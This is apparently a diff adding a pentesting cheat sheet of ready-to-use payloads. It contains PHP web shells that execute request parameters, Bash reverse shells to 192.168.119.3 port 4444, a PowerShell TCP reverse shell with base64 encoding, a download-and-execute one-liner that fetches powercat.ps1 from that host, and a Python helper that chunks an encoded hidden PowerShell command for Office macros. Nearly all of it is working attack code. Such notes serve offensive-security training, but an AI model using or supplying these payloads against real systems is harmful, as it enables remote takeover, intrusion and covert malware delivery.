@@ -1,0 +1,53 @@
+#### PHP based payloads
+```PHP
+<?php echo system($_GET['cmd']); ?>
+```
+
+```PHP
+<?php
+if(isset($_REQUEST['cmd'])){
+	echo "<pre>";
+	$cmd = ($_REQUEST['cmd']);
+	system($cmd);
+	echo "";
+	die; 
+	} 
+?>
+```
+### Linux reverse shells
+##### Bash
+```BASH
+bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
+bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
+```
+
+### Windows reverse shells
+##### Powershell
+```POWERSHELL
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close()'
+
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+```
+
+```POWERSHELL
+IEX (New-Object 
+System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 
+192.168.119.3 -p 4444 -e powershell
+```
+
+###### Split above powershell command into chunks to be used by macros.
+```Python
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
+n = 50
+for i in range(0, len(str), n):
+ print("Str = Str + " + '"' + str[i:i+n] + '"')
+```
+
+### Useful webshells in Kali
+```BASH
+kali@kali:~$ ls -la /usr/share/webshells
+```
+
